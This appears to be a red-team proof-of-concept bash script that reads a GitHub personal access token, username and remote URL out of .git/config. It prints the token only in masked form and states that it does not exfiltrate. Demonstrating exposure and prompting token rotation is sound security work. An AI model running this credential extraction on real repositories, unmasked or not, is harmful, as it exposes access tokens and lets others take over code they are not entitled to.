#!/bin/bash
# PAT Extraction Payload — T1552.001 (PoC only, masked output)
# ROE: Fork/canary — proof not destruction

GITCONFIG=".git/config"
if [ ! -f "$GITCONFIG" ]; then
  echo "[-] .git/config not found"
  exit 1
fi

# Extract PAT (masked for safety)
PAT=$(grep -oP 'https://[^:]+:\K[^@]+(?=@github.com)' "$GITCONFIG" 2>/dev/null)
if [ -z "$PAT" ]; then
  echo "[-] No PAT found in git remote URL"
  exit 0
fi

echo "[+] PAT found: ${PAT:0:4}...${PAT: -4}"
echo "[+] Username: $(grep -oP 'https://\K[^:]+' "$GITCONFIG" 2>/dev/null)"
echo "[+] Remote: $(grep -oP 'url = \K.*' "$GITCONFIG" 2>/dev/null | sed 's/:[^@]*@/:****@/')"
echo "[+] Repo access: FULL (read/write)"
echo "[!] CANARY MODE: Not exfiltrating. Rotate PAT immediately."
